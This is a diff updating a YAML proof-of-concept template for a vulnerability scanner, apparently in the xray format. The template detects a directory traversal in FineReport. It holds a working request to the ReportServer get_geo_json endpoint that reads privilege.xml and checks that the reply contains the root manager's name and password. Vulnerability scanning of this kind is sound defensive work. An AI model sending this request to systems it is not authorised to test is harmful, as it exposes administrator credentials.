@@ -1,11 +1,16 @@
 name: poc-yaml-finereport-directory-traversal
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(b"<rootManagerName>") && response.body.bcontains(b"<rootManagerPassword>")
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"<rootManagerName>") && response.body.bcontains(b"<rootManagerPassword>")
+expression: r0()
 detail:
-  author: l1nk3r(http://www.lmxspace.com/)
-  links:
-    - http://foreversong.cn/archives/1378
+    author: l1nk3r(http://www.lmxspace.com/)
+    links:
+        - http://foreversong.cn/archives/1378
